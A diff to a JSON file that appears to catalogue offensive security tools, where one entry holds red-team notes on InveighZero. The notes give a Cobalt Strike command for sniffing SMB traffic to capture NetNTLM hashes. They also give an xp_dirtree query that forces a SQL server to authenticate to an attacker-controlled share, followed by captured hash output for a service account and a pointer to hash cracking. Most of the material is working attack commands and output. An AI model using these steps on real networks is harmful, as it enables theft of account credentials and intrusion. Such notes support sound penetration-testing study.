@@ -1815,7 +1815,7 @@
     "content": "# InveighZero\n\n## [[NTLM Relaying]]\nCapture NetNTLM hash\nThis should be run as a local admin.\n\n\u2139 InveighZero will ignore traffic coming from accounts that are generally deemed to be \"uncrackable\" such as computer accounts.\n```beacon\nbeacon> execute-assembly C:\\Tools\\InveighZero\\Inveigh\\bin\\Debug\\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N\n\n[*] Inveigh 0.913 started at 2022-03-10T18:02:36\n[+] Elevated Privilege Mode = Enabled\n[+] Primary IP Address = 10.10.17.231\n[+] Spoofer IP Address = 10.10.17.231\n[+] Packet Sniffer = Enabled\n[+] DHCPv6 Spoofer = Disabled\n[+] DNS Spoofer = Disabled\n[+] LLMNR Spoofer = Disabled\n[+] LLMNRv6 Spoofer = Disabled\n[+] mDNS Spoofer = Disabled\n[+] NBNS Spoofer = Disabled\n[+] HTTP Capture = Disabled\n[+] Proxy Capture = Disabled\n[+] WPAD Authentication = NTLM\n[+] WPAD NTLM Authentication Ignore List = Firefox\n[+] SMB Capture = Enabled\n[+] Machine Account Capture = Disabled\n[+] File Output = Disabled\n[+] Log Output = Enabled\n[+] Pcap Output = Disabled\n[+] Previous Session Files = Not Found\n[*] Press ESC to access console\n```\n\n## [[SQL NetNTLM Capture]]\nWe can use [[InveighZero]] to listen to the incoming requests (this should be run as a local admin).\n1. [[InveighZero#Capture NetNTLM hash]]\n2. Run `xp_dirtree` to connect the sql server to your machine running [[InveighZero]]\n>EXEC xp_dirtree '\\\\10.10.17.231\\pwn', 1, 1\n3. Receive hash on the attacking machine\n```beacon\n[+] [2022-05-14T15:33:49] TCP(445) SYN packet from 10.10.1.20:50323\n[+] [2022-05-14T15:33:49] SMB(445) negotiation request detected from 10.10.1.20:50323\n[+] [2022-05-14T15:33:49] SMB(445) NTLM challenge 3006547FFC8E90D8 sent to 10.10.1.20:50323\n[+] [2022-05-14T15:33:49] SMB(445) NTLMv2 captured for EDU\\svc_mssql from 10.10.1.20(SRV1):50323:\nsvc_mssql::EDU:[...snip...]\n```\n4. [[Hashcat#Cracking netntlmv2]]\n\n\n",
     "commands": [],
     "latest_commit": "2022-08-28T22:17:52Z",
-    "language": null
+    "language": "C#"
   },
   {
     "name": "Invoke-DCOM",
@@ -6311,8 +6311,7 @@
             }
           ]
         }
-      },
-      null
+      }
     ],
     "content": "",
     "references": [],
